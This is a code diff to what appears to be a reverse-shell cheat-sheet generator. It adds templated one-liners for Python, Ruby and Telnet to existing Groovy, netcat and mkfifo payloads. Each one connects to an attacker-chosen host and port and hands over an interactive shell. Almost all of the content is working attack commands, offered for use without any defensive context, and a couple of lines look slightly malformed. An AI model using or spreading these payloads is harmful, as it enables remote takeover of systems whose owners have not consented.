@@ -46,11 +46,8 @@ r = Runtime.getRuntime()
 p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ext}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 
- \033[1;49;35m[ + ] \033[4;49;96mPERL\033[0m
-
  \033[1;49;35m[ + ] \033[4;49;96mPYTHON\033[0m
-
- \033[1;49;35m[ + ] \033[4;49;96mPHP\033[0m
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ext}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'
 
  \033[1;49;35m[ + ] \033[4;49;96mNC-PLAIN\033[0m
 nc -e {shell} {ext}/{port}
@@ -59,10 +56,11 @@ nc -e {shell} {ext}/{port}
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ext} {port} >/tmp/f
 
  \033[1;49;35m[ + ] \033[4;49;96mRUBY\033[0m
+ruby -rsocket -e'f=TCPSocket.open("{ext}",{port}).to_i;exec sprintf("{shell}-i <&%d >&%d 2>&%d",f,f,f)'
 
  \033[1;49;35m[ + ] \033[4;49;96mTELNET\033[0m
-
- \033[1;49;35m[ + ] \033[4;49;96mWIN-POWERSHELL\033[0m""")
+rm -f /tmp/p; mknod /tmp/p p && telnet {ext} {port} 0/tmp/p
+""")
 print("")
 print("\033[97m╔══════════════════════════════════════════════╗")
 
